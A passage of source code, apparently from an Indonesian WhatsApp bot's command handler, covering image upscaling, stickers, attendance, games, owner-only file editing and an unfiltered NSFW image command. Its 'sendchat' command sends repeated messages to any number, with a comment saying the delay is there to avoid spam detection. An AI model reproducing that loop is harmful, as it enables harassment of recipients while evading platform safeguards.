  let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'biyu.jpg');
  let img = directLink.toString();

  if (!img) {
    await fs.unlinkSync(media);
    return m.reply('Gagal upload ke pixhost.to bree...');
  }

  let fileName = img.split('/').pop().split('#')[0].split('?')[0] || 'image.jpg';
  if (fileName.endsWith('.webp')) {
    fileName = fileName.replace('.webp', '.jpg');
  }

  let res = await axios.get(img, { responseType: 'arraybuffer' });
  let fileSize = parseInt(res.headers['content-length'] || res.data.length);
  let width = Math.floor(Math.random() * (2000 - 800 + 1)) + 800;
  let height = Math.floor(Math.random() * (2000 - 800 + 1)) + 800;

  if (fileSize > 5 * 1024 * 1024) {
    await fs.unlinkSync(media);
    return m.reply("Size imagenya kegedean bree.. Max 5MB yaa");
  }

  await m.reply('Sabar yak... lagi proses upscaling...');

  const config = {
    x2: '2',
    style: style,
    noise: noise,
    file_name: fileName,
    files_size: fileSize,
    file_height: height,
    file_width: width,
    input: img
  };

  try {
    const headers = {
      'origin': 'https://bigjpg.com',
      'referer': 'https://bigjpg.com/',
      'user-agent': 'Postify/1.0.0',
      'x-requested-with': 'XMLHttpRequest'
    };
    const params = new URLSearchParams();
    params.append('conf', JSON.stringify(config));
    const taskx = await axios.post('https://bigjpg.com/task', params, { headers });
    if (taskx.data.status !== 'ok') {
      await fs.unlinkSync(media);
      return m.reply('Gagal bikin task upscaling bree...');
    }
    const taskId = taskx.data.info;
    let attempts = 0;
    const maxAttempts = 20;
    while (attempts < maxAttempts) {
      const check = await axios.get(`https://bigjpg.com/free?fids=${JSON.stringify([taskId])}`, { headers });
      const result = check.data[taskId];

      if (result[0] === 'success') {
        await fs.unlinkSync(media);
        let teks = `*Upscale Berhasil Bree!*\n\n`;
        teks += `• Nama File: ${fileName}\n`;
        teks += `• Size: ${(fileSize / 1024).toFixed(2)} KB\n`;
        teks += `• Resolusi: ~${width}x${height}\n`;
        teks += `• Style: ${availableStyles[style]}\n`;
        teks += `• Noise Reduction: ${availableNoise[noise]}\n\n`;
        teks += `*Link Hasil:* ${result[1]}`;
        return conn.sendMessage(m.chat, {
          image: { url: result[1] },
          caption: teks
        }, { quoted: m });
      }
      if (result[0] === 'error') {
        await fs.unlinkSync(media);
        return m.reply('Upscalenya gagal bree.. Coba lagi nanti yak!');
      }
      await new Promise(resolve => setTimeout(resolve, 15000)); 
      attempts++;
    }
    await fs.unlinkSync(media);
    return m.reply('Timeout bree... Proses kelamaan wkwk');
  } catch (err) {
    await fs.unlinkSync(media);
    return m.reply('Error saat proses upscaling: ' + err.message);
  }
}
break
case 'unblur': {
    if (!quoted) return m.reply('Harap balas ke foto yang ingin di-unblur')
    if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

    const BodyForm = require('form-data')
    const uploadFileUgu = async (input) => {
        try {
            const form = new BodyForm()
            form.append("files[]", fs.createReadStream(input))
            const axios = require('axios');
            const { data } = await axios({
                url: "https://uguu.se/upload.php",
                method: "POST",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                    ...form.getHeaders()
                },
                data: form,
                timeout: 10000 
            })
            
            if (!data?.files?.[0]) throw new Error('Upload failed')
            return data.files[0]
            
        } catch (err) {
            throw new Error(`Error uploading file: ${err.message}`)
        }
    }
    try {
    await conn.sendMessage(m.chat, { 
            react: { 
                text: '⏱️', 
                key: m.key 
            }
        })
        const media = await conn.downloadAndSaveMediaMessage(quoted)
        const uploadResult = await uploadFileUgu(media)
        const imageUrl = `https://fastrestapis.fasturl.cloud/aiimage/imgunblur?url=${uploadResult.url}`
        await conn.sendMessage(m.chat, { 
            image: { url: imageUrl }, 
            caption: '*Ini hasil unblur gambarnya*' 
        }, { 
            quoted: m
        })
        fs.unlinkSync(media)
    } catch (error) {
        console.error('Error in unblur:', error)
        m.reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
    }
}
break
case "imgsharpen": {
    if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
    let media = await conn.downloadAndSaveMediaMessage(qmsg)
    const { ImageUploadService } = require('node-upload-images')
    const service = new ImageUploadService('pixhost.to')
    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'biyuofficial.png')
    let api = `https://fastrestapis.fasturl.cloud/aiimage/imgsharpen?url=${directLink}`
    await conn.sendMessage(m.chat, { image: { url: api }, caption: "Nih hasil *imgsharpen*-nya..." }, { quoted: m })
    await fs.unlinkSync(media)
}
break
case "nsfw": case "randomnsfw": {
  m.reply(mess.wait);
  const axios = require('axios');
  let anu = `https://restapi-v2.simplebot.my.id/random/nsfw`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' });
  try {
    conn.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Done Boss'
    }, {quoted: m})
  } catch (e) {
     console.log(e)
}
}
break

case 'order':
case 'pesanan': {
 if (!q) return m.reply('☘️ *Mana teksnya?*');
 if (q.length > 15) return m.reply('☘️ *Maksimal 15 karakter!*');
 m.reply('📦 *Pesanan berhasil terkirim!*\n🎁 *Pesanan Anda akan dibalas secepatnya, terima kasih!*');
 let pesan = `📣 *Pesanan Baru!*\n🎁 *Dari:* @${m.sender.split('@')[0]}\n📄 *Nomor:* ${m.sender.split('@')[0]}\n📑 *Pemesan:* wa.me/${m.sender.split('@')[0]}\n📦 *Order:* ${q}\n\n📣 *Pesanan ini dikirim oleh bot!*`; conn.sendMessage(`${global.owner}@s.whatsapp.net`, { 
 text: pesan, 
 mentions: [m.sender] 
 }, { quoted: m });
}
break
case 'getpp': {
  let user;
  if (m.quoted) {
    user = m.quoted.sender;
  } else if (text) {
    const mentioned = text.match(/@(\d{5,})/);
    if (mentioned) {
      user = mentioned[1] + '@s.whatsapp.net';
    } else if (text.includes('62')) {
      const number = text.replace(/[^0-9]/g, '');
      user = number + '@s.whatsapp.net';
    } else {
      return m.reply('Format salah! Gunakan .getpp @tag atau .getpp 628xx');
    }
  } else {
    user = m.quoted ? m.quoted.sender : m.sender;
  }
  try {
    let pp = await conn.profilePictureUrl(user, 'image');
    await conn.sendMessage(m.chat, {
      image: { url: pp },
      caption: `Foto profil dari *@${user.split('@')[0]}*`,
      mentions: [user]
    });
  } catch (e) {
    m.reply('Gagal mengambil foto profil! Mungkin tidak ada atau disembunyikan.');
  }
}
break
  case 'absen':
    if (!m.isGroup) return m.reply('Perintah hanya dapat digunakan di grup! Ketik .absen untuk melakukan absen.');
    const filePath = './absen.json';
    const senderId = m.sender;
    const groupId = m.chat;
    if (!fs.existsSync(filePath) || fs.readFileSync(filePath, 'utf-8').trim() === '') {
      const absenData = { absensi: [] };
      fs.writeFileSync(filePath, JSON.stringify(absenData, null, 2), 'utf-8');
      m.reply('File absen kosong atau belum ada, sudah dibuat otomatis! Ketik .absen untuk melakukan absen.');
    } else {
      const absenData = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
      const today = new Date().toISOString().split('T')[0];
      const userAbsen = absenData.absensi.find(entry => entry.id === senderId && entry.tanggal === today && entry.groupId === groupId);
      if (userAbsen) {
        m.reply('Kamu sudah absen hari ini! Ketik .riwayatabsen untuk melihat riwayat absen.');
      } else {
        absenData.absensi.push({ id: senderId, tanggal: today, groupId: groupId });
        fs.writeFileSync(filePath, JSON.stringify(absenData, null, 2), 'utf-8');
        m.reply('Absen kamu hari ini sudah tercatat! Ketik .riwayatabsen untuk melihat riwayat absen.');
      }
    }
    break

  case 'listabsen':
    if (!m.isGroup) return m.reply('Perintah hanya dapat digunakan di grup! Ketik .listabsen untuk melihat daftar absen grup.');
    const filePathList = './absen.json';
    const groupIdList = m.chat;
    const absenList = JSON.parse(fs.readFileSync(filePathList, 'utf-8'));
    const absenListFormatted = absenList.absensi
      .filter(entry => entry.groupId === groupIdList)
      .map(entry => `${entry.id} - ${entry.tanggal}`)
      .join('\n');
    if (absenListFormatted) {
      m.reply(`List Absen untuk grup ini:\n${absenListFormatted}`);
    } else {
      m.reply('Belum ada yang absen di grup ini. Ketik .absen untuk memulai absen.');
    }
    break

  case 'riwayatabsen':
    if (!m.isGroup) return m.reply('Perintah hanya dapat digunakan di grup! Ketik .riwayatabsen untuk melihat riwayat absen kamu.');
    const filePathRiwayat = './absen.json';
    const senderIdRiwayat = m.sender;
    const groupIdRiwayat = m.chat;
    const riwayatAbsen = JSON.parse(fs.readFileSync(filePathRiwayat, 'utf-8'));
    const riwayatUser = riwayatAbsen.absensi.filter(entry => entry.id === senderIdRiwayat && entry.groupId === groupIdRiwayat);
    if (riwayatUser.length === 0) {
      m.reply('Kamu belum pernah absen di grup ini. Ketik .absen untuk memulai absen.');
    } else {
      const riwayatFormatted = riwayatUser.map(entry => `Tanggal: ${entry.tanggal}`).join('\n');
      m.reply(`Riwayat Absen Kamu di grup ini:\n${riwayatFormatted}`);
    }
    break

  case 'totalabsen':
    if (!m.isGroup) return m.reply('Perintah hanya dapat digunakan di grup! Ketik .totalabsen untuk melihat total absen kamu.');
    const filePathTotal = './absen.json';
    const senderIdTotal = m.sender;
    const groupIdTotal = m.chat;
    const absenTotal = JSON.parse(fs.readFileSync(filePathTotal, 'utf-8'));
    const totalAbsenUser = absenTotal.absensi.filter(entry => entry.id === senderIdTotal && entry.groupId === groupIdTotal).length;
    m.reply(`Total absen kamu di grup ini: ${totalAbsenUser}. Ketik .riwayatabsen untuk melihat riwayat absen.`);
    break

  case 'berhentiabsen':
    if (!m.isGroup) return m.reply('Perintah hanya dapat digunakan di grup! Ketik .berhentiabsen untuk berhenti melakukan absen.');
    const filePathBerhenti = './absen.json';
    const senderIdBerhenti = m.sender;
    const groupIdBerhenti = m.chat;
    const absenDataBerhenti = JSON.parse(fs.readFileSync(filePathBerhenti, 'utf-8'));
    const absenUpdated = absenDataBerhenti.absensi.filter(entry => entry.id !== senderIdBerhenti || entry.groupId !== groupIdBerhenti);
    fs.writeFileSync(filePathBerhenti, JSON.stringify({ absensi: absenUpdated }, null, 2), 'utf-8');
    m.reply('Absen kamu telah dihentikan dan dihapus di grup ini. Ketik .absen untuk mulai absen lagi.');
    break

  case 'rekapabsen':
    if (!m.isGroup) return m.reply('Perintah hanya dapat digunakan di grup! Ketik .rekapabsen untuk melihat rekap absen grup.');
    const filePathRekap = './absen.json';
    const groupIdRekap = m.chat;
    const rekapAbsen = JSON.parse(fs.readFileSync(filePathRekap, 'utf-8'));
    const absenRekap = rekapAbsen.absensi.filter(entry => entry.groupId === groupIdRekap);
    const absenUserRekap = absenRekap.reduce((acc, entry) => {
      if (acc[entry.id]) {
        acc[entry.id]++;
      } else {
        acc[entry.id] = 1;
      }
      return acc;
    }, {});
    const rekapFormatted = Object.keys(absenUserRekap).map(id => `${id}: ${absenUserRekap[id]} absen`).join('\n');
    if (rekapFormatted) {
      m.reply(`Rekap Absen untuk grup ini:\n${rekapFormatted}`);
    } else {
      m.reply('Belum ada yang absen di grup ini. Ketik .absen untuk memulai absen.');
    }
    break
case "stickersearch2": case 'sh2': case "searchsticker2": {
    if (!text) return m.reply('Sticker Apa Yg Kamu Cari?')
    m.reply('_Sedang Mencari Sticker..._');
    
    try {
        let apiUrl = `https://fastrestapis.fasturl.cloud/sticker/cloud?name=${encodeURIComponent(text)}`;
        const res = await fetch(apiUrl);
        const response = await res.json();
        
        if (!response.result?.result?.data || response.result.result.data.length === 0) {
            return m.reply('Tidak ditemukan sticker yang sesuai');
        }

        let filteredPacks = response.result.result.data.filter(pack => {
            const searchTerms = text.toLowerCase().split(' ');
            const packTitle = pack.title.toLowerCase();
            const packTags = pack.tags ? pack.tags.join(' ').toLowerCase() : '';
            
            return searchTerms.some(term => 
                packTitle.includes(term) || packTags.includes(term)
            );
        });

        if (filteredPacks.length === 0) {
            return m.reply(`Tidak ditemukan sticker ${text} yang sesuai`);
        }

        const packNames = [
            "Sticker Keren ",
            "Sticker Lucu ",
            "Created ",
            "Special Sticker ",
            "Random Sticker ",
            "Koleksi Sticker ",
            "Sticker Pack ",
            "Daily Sticker ",
            "Magic Sticker ",
            "Cute Sticker "
        ];
        let validPacks = filteredPacks.filter(pack => pack.stickers && pack.stickers.length >= 5);
        if (validPacks.length === 0) validPacks = filteredPacks; 

        const randomPackIndex = Math.floor(Math.random() * validPacks.length);
        const stickerPack = validPacks[randomPackIndex];
        
        let packInfo = `*Hasil Pencarian Sticker ${text}*\n` +
                      `- *Title:* ${stickerPack.title}\n` +
                      `- *Slug:* ${stickerPack.slug}\n` +
                      `- *Tags:* ${stickerPack.tags ? stickerPack.tags.join(', ') : 'No tags'}\n` +
                      `- *Animated:* ${stickerPack.animated ? 'Yes' : 'No'}\n` +
                      `- *Author:* ${stickerPack.author?.username || 'Unknown'}\n` +
                      `- *Jumlah Sticker:* ${stickerPack.stickers.length}\n` +
                      `_Mengirim Sticker Harap Tunggu..._`;
        
        await conn.sendMessage(m.chat, { text: packInfo }, { quoted: m });
        let allStickers = [...stickerPack.stickers];
        allStickers.sort(() => Math.random() - 0.5);
        const maxStickers = Math.min(10, allStickers.length);
        let successCount = 0;
        let attemptCount = 0;
        
        while (successCount < maxStickers && attemptCount < allStickers.length) {
            try {
                const sticker = allStickers[attemptCount];
                const randomPackname = packNames[Math.floor(Math.random() * packNames.length)];
                
                await conn.sendAsSticker(m.chat, sticker.sticker_src, m, {
                    packname: randomPackname,
                    author: `By ${global.namaOwner}`
                });
                
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (stickerError) {
                console.log(`Error sending sticker:`, stickerError);
            }
            attemptCount++;
        }

        if (successCount < maxStickers) {
            m.reply(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
        } else if (stickerPack.stickers.length > 10) {
            m.reply(`Menampilkan ${successCount} sticker random dari ${stickerPack.stickers.length} sticker yang ditemukan`);
        }

    } catch (e) {
        console.error('Error in stickersearch:', e);
        m.reply('Terjadi kesalahan saat mencari sticker');
    }
}
break

case 'str': {
 if (!text) return m.reply('Format salah!\nGunakan: .str <mode> <tipe> <teks>\n\nMode:\n - encode\n - decode\n\nTipe:\n - char\n - hex\n\nContoh:\n.str encode char Halo\n.str encode hex Halo\n.str decode char 72,97,108,111\n.str decode hex 48616c6f');
 const yubik = text.split(' ');
 const mode = yubik[0]; 
 const type = yubik[1]; 
 const inputText = yubik.slice(2).join(' ');
 if (!mode || !type || !inputText) return m.reply('Format salah! Cek contoh penggunaan di atas.');
 let result;
 if (mode === 'encode') {
 if (type === 'char') {
 result = inputText.split('').map(char => char.charCodeAt(0)).join(', ');
 } else if (type === 'hex') {
 result = inputText.split('').map(char => char.charCodeAt(0).toString(16)).join(''); 
 } else {
 return m.reply('Tipe salah! Gunakan "char" atau "hex".');
 }
 } else if (mode === 'decode') {
 if (type === 'char') {
 result = inputText.split(',').map(code => String.fromCharCode(parseInt(code.trim()))).join('');
 } else if (type === 'hex') {
 result = inputText.match(/.{1,2}/g).map(hex => String.fromCharCode(parseInt(hex, 16))).join(''); 
 } else {
 return m.reply('Tipe salah! Gunakan "char" atau "hex".');
 }
 } else {
 return m.reply('Mode salah! Gunakan "encode" atau "decode".');
 }
 let pushname = m.pushName || m.sender.split('@')[0]; 
 let ppUrl = await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/2f61d40b7cfb440f3cfa7.jpg');
 let pesan = `🍩 *Hasil ${mode.charAt(0).toUpperCase() + mode.slice(1)} (${type.toUpperCase()}):*\n\n${result}`;
 let msg = {
 image: { url: ppUrl },
 caption: `👤 *${pushname}*\n\n${pesan}`,
 contextInfo: { mentionedJid: [m.sender] }
 };
 return conn.sendMessage(m.chat, msg);
}
break

case 'game': {
  if (!isSewa) return m.reply('Fitur ini hanya untuk grup penyewa.');
    if (!text) return m.reply(`Contoh: .game tebakgambar

List game:
- tebakgambar
- tebaklogo
- surah
- siapakahaku
- tebaklirik
- caklontong
- susunkata
- tebakbendera
- tebakheroml
- tebakjkt`);

    if (Object.values(game).find(g => g.chat === m.chat)) return m.reply('Masih ada game yang berjalan di chat ini!');

    const valid = ['tebakgambar', 'tebaklogo', 'surah', 'siapakahaku', 'tebaklirik', 'caklontong', 'susunkata', 'tebakbendera', 'tebakheroml', 'tebakjkt'];
    if (!valid.includes(text.toLowerCase())) return m.reply(`Game tidak ditemukan!\nGunakan salah satu dari:\n${valid.map(v => `- ${v}`).join('\n')}`);

    let res = await fetch(`https://api.siputzx.my.id/api/games/${text}`);
    let json = await res.json();
    let jawaban = json.data?.jawaban || json.jawaban || json.name || json.data?.data?.jawaban || '';
    jawaban = (jawaban || '').toLowerCase();

    if (text.toLowerCase() === 'surah') {
        jawaban = [
            json.data.surah?.englishName?.toLowerCase(),
            json.data.surah?.name?.toLowerCase()
        ];
    }

    let soalText = '';
    let type = 'text';
    let waktuMs = 60 * 1000;
    let imageUrl = null;
    let send;

    switch (text.toLowerCase()) {
        case 'tebakgambar':
            type = 'image';
            soalText = `*TEBAK GAMBAR*\n\nWaktu: 60 detik\nBalas pesan ini dengan jawabanmu!`;
            imageUrl = json.data?.img;
            break;
        case 'tebaklogo':
            type = 'image';
            soalText = `*TEBAK LOGO*\n\nWaktu: 60 detik\nBalas pesan ini dengan jawabanmu!`;
            imageUrl = json.data?.data?.image;
            break;
        case 'tebakbendera':
            type = 'image';
            soalText = `*TEBAK BENDERA*\n\nWaktu: 60 detik\nBalas pesan ini dengan jawabanmu!`;
            imageUrl = json.img || json.data?.img;
            break;
        case 'tebakjkt':
            type = 'image';
            soalText = `*TEBAK MEMBER JKT48*\n\nWaktu: 60 detik\nBalas pesan ini dengan jawabanmu!`;
            imageUrl = json.data?.gambar;
            break;
        case 'surah':
            soalText = `*TEBAK SURAH*\n\n${json.data.text}\n\nWaktu: 60 detik`;
            send = await conn.sendMessage(m.chat, {
                audio: { url: json.data.audio },
                mimetype: 'audio/mp4',
                ptt: false
            }, { quoted: m });
            break;
        case 'caklontong':
            soalText = `*CAK LONTONG*\n\n${json.data.soal}\n\nWaktu: 60 detik\n*Jawabanmu mungkin tidak terduga!*`;
            break;
        case 'tebaklirik':
            soalText = `*TEBAK LIRIK*\n\n${json.data.soal}\n\nWaktu: 60 detik`;
            break;
        case 'siapakahaku':
            soalText = `*SIAPAKAH AKU?*\n\n${json.data.soal}\n\nWaktu: 60 detik`;
            break;
        case 'susunkata':
            soalText = `*SUSUN KATA*\n\n${json.data.soal}\n\nTipe: ${json.data.tipe || '-'}\nWaktu: 60 detik`;
            break;
        case 'tebakheroml':
            jawaban = json.data?.name?.toLowerCase();
            soalText = `*TEBAK HERO ML*\n\nDengarkan suara hero berikut!\n\nWaktu: 60 detik`;
            try {
                const audioUrl = json.data.audio;
                send = await conn.sendMessage(m.chat, {
                    audio: { url: audioUrl },
                    mimetype: 'audio/mp4',
                    ptt: false
                }, { quoted: m });
            } catch (error) {
                m.reply('Gagal mengirim audio hero. Coba lagi nanti.');
            }
            break;
    }

    if (!send) {
        if (type === 'image' && imageUrl) {
            send = await conn.sendMessage(m.chat, {
                image: { url: imageUrl },
                caption: soalText
            }, { quoted: m });
        } else {
            send = await m.reply(soalText);
        }
    }

    const timer = setInterval(() => {
        let sisa = Math.floor((game[m.chat]?.waktu - Date.now()) / 1000);
        if (sisa > 0) {
            conn.sendMessage(m.chat, {
                edit: game[m.chat].soal.key,
                caption: soalText.replace(/Waktu:.*detik/, `Waktu: ${sisa} detik`)
            }).catch(() => {});
        }
    }, 10_000);
    game[m.chat] = {
        jawaban,
        waktu: Date.now() + waktuMs,
        soal: send,
        chat: m.chat,
        updateInterval: timer
    };
}
break

case "ambilkode": case "code":  {
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (!text) return m.reply(`Gunakan: ${prefix + command} namafile.js:baris`);
    try {
        const [fileName, lineNumber] = text.split(':');
        if (!fileName || !lineNumber) return m.reply('❌ Format salah. Gunakan: namafile.js:baris');
        const fs = require('fs');
        const path = require('path');
        const baseDir = '/home/container/';
        const filePath = path.join(baseDir, fileName);
        if (!fs.existsSync(filePath)) {
            return m.reply(`❌ File ${fileName} tidak ditemukan.`);
        }
        const fileContent = fs.readFileSync(filePath, 'utf8');
        const lines = fileContent.split('\n');
        const lineNum = parseInt(lineNumber);
        if (isNaN(lineNum) || lineNum <= 0 || lineNum > lines.length) {
            return m.reply(`❌ Baris ${lineNumber} tidak valid. File memiliki ${lines.length} baris.`);
        }
        const requestedLine = lines[lineNum - 1];
        m.reply(`📄 *${fileName}:${lineNum}*\n\n\`\`\`${requestedLine}\`\`\``);
    } catch (err) {
        console.error(err);
        m.reply('❌ Terjadi kesalahan saat mengambil kode.');
    }
}
break

case "startnews":
if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
if (isCheckingNews) return m.reply("✅ Auto news sudah aktif.");
isCheckingNews = true;
newsInterval = setInterval(() => checkAndSendNews(conn), 60000);
return m.reply("✅ Auto news diaktifkan. Cek setiap 1 menit.");
case "stopnews":
if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
isCheckingNews = false;
clearInterval(newsInterval);
return m.reply("❌ Auto news dimatikan.");

case 'startlivejkt48':
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (isCheckingLive) return m.reply('Notifikasi live JKT48 sudah aktif.');
    isCheckingLive = true;
    m.reply('✅ Notifikasi live JKT48 diaktifkan!');
    checkLive(conn); 
    break
case 'stoplivejkt48':
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    isCheckingLive = false;
    m.reply('⛔ Notifikasi live JKT48 dimatikan.');
    break
    
case "setkode": case "setcode": {
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (!text) return m.reply(`Gunakan: ${prefix + command} namafile.js:baris|kode baru`);
    try {
        const [fileInfo, newCode] = text.split('|');
        if (!fileInfo || !newCode) return m.reply('❌ Format salah. Gunakan: namafile.js:baris|kode baru');
        const [fileName, lineNumber] = fileInfo.split(':');
        if (!fileName || !lineNumber) return m.reply('❌ Format file salah. Gunakan: namafile.js:baris');
        const fs = require('fs');
        const path = require('path');
        const baseDir = '/home/container/';
        const filePath = path.join(baseDir, fileName);
        if (!fs.existsSync(filePath)) {
            return m.reply(`❌ File ${fileName} tidak ditemukan.`);
        }
        const fileContent = fs.readFileSync(filePath, 'utf8');
        const lines = fileContent.split('\n');
        const lineNum = parseInt(lineNumber);
        if (isNaN(lineNum) || lineNum <= 0 || lineNum > lines.length) {
            return m.reply(`❌ Baris ${lineNumber} tidak valid. File memiliki ${lines.length} baris.`);
        }
        const oldLine = lines[lineNum - 1];
        lines[lineNum - 1] = newCode;
        fs.writeFileSync(filePath, lines.join('\n'), 'utf8');
        m.reply(`✅ *Kode berhasil diubah pada ${fileName}:${lineNum}*\n\n*Kode lama:*\n\`\`\`${oldLine}\`\`\`\n\n*Kode baru:*\n\`\`\`${newCode}\`\`\``);
    } catch (err) {
        console.error(err);
        m.reply('❌ Terjadi kesalahan saat mengubah kode.');
    }
}
break

case 'setfile': case 'setjs': {
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
 let filePath, newContent;
 if (text.includes('|')) {
 const splitText = text.split('|');
 filePath = splitText[0].trim();
 newContent = splitText.slice(1).join('|'); 
 } else if (text && m.quoted) {
 filePath = text.trim();
 newContent = m.quoted.text || m.quoted.content || m.quoted.message?.text || m.quoted.message?.conversation || '';
 } else {
 return m.reply(`*Format Salah!*\nContoh:\n${prefix + command} settings.js|kode`);
 }
 if (!filePath) {
 return m.reply(`*Format Salah!*\nLokasi file tidak boleh kosong`);
 }
 try {
 const fs = require('fs');
 const path = require('path');
 const absolutePath = path.isAbsolute(filePath) ? filePath : path.resolve(filePath); 
 if (!fs.existsSync(absolutePath)) {
 try {
 const dir = path.dirname(absolutePath);
 if (!fs.existsSync(dir)) {
 fs.mkdirSync(dir, { recursive: true });
 }
 fs.writeFileSync(absolutePath, '');
 m.reply(`File '${filePath}' tidak ditemukan. File baru telah dibuat.`);
 } catch (err) {
 return m.reply(`*Gagal Membuat File!*\nFile '${filePath}' tidak dapat dibuat: ${err.message}`);
 }
 }
 if (!newContent) {
 return m.reply(`*Gagal Mengubah File!*\nKonten tidak boleh kosong.`);
 }
 fs.writeFileSync(absolutePath, newContent);
 await conn.sendMessage(m.chat, { text: `_Berhasil Mengubah Isi File ${filePath} ✅_` }, { quoted: m });
 const settingsPath = path.resolve('settings.js');
 const modifiedPath = path.resolve(filePath);
 if (settingsPath === modifiedPath || filePath.includes('settings.js')) {
 m.reply('_Perubahan pada settings.js terdeteksi. Bot akan restart..._');
 setTimeout(() => {
 process.exit(0);
 }, 2000);
 }
 } catch (error) {
 console.error(`Error updating ${filePath}:`, error);
 await conn.sendMessage(m.chat, { text: `_Gagal menyimpan perubahan ke file ${filePath}: ${error.message}_` }, { quoted: m });
 }
}
break
case 'sendchat': case 'kirimpesan': {
    if (!isCreator) return m.reply('Fitur ini hanya untuk creator.')
    if (!q.includes('|')) return m.reply(`Format salah!\nContoh: sendchat 628xxx|Halo|5`)
    let [nomor, teks, jumlah] = q.split('|')
    if (!nomor || !teks || isNaN(jumlah)) return m.reply('Pastikan formatnya benar dan jumlah adalah angka.')
    nomor = nomor.replace(/\D/g, '') + '@s.whatsapp.net'
    jumlah = parseInt(jumlah)
    m.reply(`Mengirim pesan ke ${nomor.split('@')[0]} sebanyak ${jumlah}x...`)
    for (let i = 0; i < jumlah; i++) {
        await conn.sendMessage(nomor, { text: teks })
        await delay(1500) // biar ga ke-detect spam
    }
    m.reply('Selesai!')
}
break
case "record": case "records":
 if (!argsbiyuoffc[0]) {
 return m.reply("Silakan masukkan domain yang ingin dicari.\n\nContoh: *records biyu-offc.biz.id*");
 }
 let domain2 = argsbiyuoffc[0];
 let apiUrl2 = `https://www.laurine.site/api/tools/subdofinder?url=${domain2}`;
 try {
 let response = await fetch(apiUrl2);
 let data = await response.json();
 if (!data.status || !data.data.results.length) {
 return reply("❌ Tidak ada data ditemukan untuk domain tersebut.");
 }
 let resultText = `🔍 *Hasil Pencarian Subdomain*\n🌐 Domain: ${domain2}\n📌 Total ditemukan: ${data.data.count}\n\n`;
 data.data.results.forEach((item, index) => {
 resultText += `*${index + 1}. ${item.hostname}*\n📌 Common Name: ${item.subject_common_name}\n📅 First Seen: ${item.first_seen}\n\n`;
 });
 m.reply(resultText.trim());
 } catch (error) {
 console.error(error);
 m.reply("❌ Terjadi kesalahan saat mengambil data.");
 }
 break
 
case 'sh': case "searchsticker": {
    if (!text) return m.reply('Sticker Apa Yg Kamu Cari?')
    m.reply('_Sedang Mencari Sticker..._');
    
    try {
        let apiUrl = `https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`;
        const res = await fetch(apiUrl);
        const response = await res.json();
        
        if (!response.data?.sticker_url || response.data.sticker_url.length === 0) {
            return m.reply('Tidak ditemukan sticker yang sesuai');
        }

        const packNames = [
            "Sticker Keren ",
            "Sticker Lucu ",
            "Created ",
            "Special Sticker ",
            "Random Sticker ",
            "Koleksi Sticker ",
            "Sticker Pack ",
            "Daily Sticker ",
            "Magic Sticker ",
            "Cute Sticker "
        ];

        let packInfo = `*Hasil Pencarian Sticker ${text}*\n` +
                      `- *Title:* ${response.data.title}\n` +
                      `- *Creator:* ${response.creator}\n` +
                      `- *Jumlah Sticker:* ${response.data.sticker_url.length}\n` +
                      `_Mengirim Sticker Harap Tunggu..._`;
        
        await conn.sendMessage(m.chat, { text: packInfo }, { quoted: m });
        let allStickers = [...response.data.sticker_url];
        allStickers.sort(() => Math.random() - 0.5);
        const maxStickers = Math.min(10, allStickers.length);
        let successCount = 0;
        let attemptCount = 0;
        
        while (successCount < maxStickers && attemptCount < allStickers.length) {
            try {
                const stickerUrl = allStickers[attemptCount];
                const randomPackname = packNames[Math.floor(Math.random() * packNames.length)];
                
                await conn.sendAsSticker(m.chat, stickerUrl, m, {
                    packname: randomPackname,
                    author: `By ${global.namaOwner}`
                });
                
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (stickerError) {
                console.log(`Error sending sticker:`, stickerError);
            }
            attemptCount++;
        }

        if (successCount < maxStickers) {
            m.reply(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
        } else if (response.data.sticker_url.length > 10) {
            m.reply(`Menampilkan ${successCount} sticker random dari ${response.data.sticker_url.length} sticker yang ditemukan`);
        }

    } catch (e) {
        console.error('Error in stickersearch:', e);
        m.reply('Terjadi kesalahan saat mencari sticker');
    }
}
break
case 'styletext': case 'ctext': case 'createtext': case 'teks': {
  if (!q) return m.reply('Masukin teksnya dulu!\nContoh: styletext Halo Saya Biyu');
  const axios = require('axios');
  const cheerio = require('cheerio');

  try {
    let res = await axios.get(`https://qaz.wtf/u/convert.cgi?text=${encodeURIComponent(q)}`);
    let $ = cheerio.load(res.data);
    let hasil = [];
    $('table > tbody > tr').each((i, el) => {
      let style = $(el).find('td').eq(0).text().trim();
      let text = $(el).find('td').eq(1).text().trim();
      if (style && text) {
        hasil.push(`*${style}:*\n${text}`);
      }
    });
    if (hasil.length === 0) return m.reply('Gagal mengambil style, coba lagi nanti.');
    let teks = `*Hasil StyleText dari:* ${q}\n\n` + hasil.join('\n\n');
    m.reply(teks);
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan saat mengambil data.');
  }
}
  break
case "cinfo": case "channelinfo": case "ci": {
 if (!argsbiyuoffc[0]) return m.reply("⚠️ Format salah!\nGunakan: .cinfo <link_channel>");
let match = argsbiyuoffc[0].match(/whatsapp\.com\/channel\/([\w-]+)/);
